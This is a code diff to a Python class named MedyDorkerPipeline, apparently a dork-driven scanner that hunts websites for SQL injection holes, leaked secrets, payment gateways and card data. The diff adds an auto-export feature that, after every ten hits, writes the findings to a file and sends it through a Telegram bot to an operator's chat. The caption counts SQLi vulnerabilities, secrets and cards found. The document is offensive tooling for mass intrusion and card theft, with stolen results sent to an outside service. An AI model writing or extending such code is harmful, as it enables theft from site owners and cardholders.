@@ -372,6 +372,8 @@ class MedyDorkerPipeline:
         os.makedirs(self._export_dir, exist_ok=True)
         self._last_export_time: Optional[datetime] = None
         self._export_counter = 0
+        self._hits_since_export = 0
+        self._auto_export_threshold = 10  # Auto-export every N hits
         
         # Load previous state
         self._load_state()
@@ -1479,6 +1481,16 @@ class MedyDorkerPipeline:
                     f"🎯 <b>HIT!</b> {', '.join(findings)}\n"
                     f"<code>{url[:80]}</code>"
                 )
+                # Auto-export every N hits
+                self._hits_since_export += 1
+                if self._hits_since_export >= self._auto_export_threshold:
+                    self._hits_since_export = 0
+                    try:
+                        filepath = await self._write_export()
+                        if filepath:
+                            await self._send_export_file(filepath)
+                    except Exception as e:
+                        logger.debug(f"Auto-export error: {e}")
         except asyncio.TimeoutError:
             logger.warning(f"URL processing timed out (180s): {url[:60]}")
         except Exception as e:
@@ -1750,6 +1762,38 @@ class MedyDorkerPipeline:
                 break
             except Exception as e:
                 logger.error(f"Status loop error: {e}")
+
+    async def _send_export_file(self, filepath: str):
+        """Send an export file to the chat via Telegram."""
+        if not self._chat_id:
+            return
+        stats = self.get_stats()
+        caption = (
+            f"📁 Auto-Export (every {self._auto_export_threshold} hits)\n"
+            f"URLs: {stats['urls_scanned']} | "
+            f"SQLi: {stats['sqli_vulns']} | "
+            f"Secrets: {stats['secrets_found']} | "
+            f"Gateways: {stats['gateways_found']} | "
+            f"Cards: {stats['cards_found']}"
+        )
+        try:
+            from telegram import Bot
+            bot = Bot(token=self.reporter.bot_token)
+            with open(filepath, 'rb') as f:
+                await bot.send_document(
+                    chat_id=self._chat_id,
+                    document=f,
+                    filename=os.path.basename(filepath),
+                    caption=caption,
+                )
+            logger.info(f"Auto-export sent: {os.path.basename(filepath)}")
+        except Exception as e:
+            logger.debug(f"Auto-export send failed: {e}")
+            await self._send_progress(
+                f"📁 <b>Auto-Export Saved</b>\n"
+                f"<code>{os.path.basename(filepath)}</code>\n"
+                f"{caption}"
+            )
 
     async def _export_loop(self):
         """Export a .txt report every hour with all findings."""
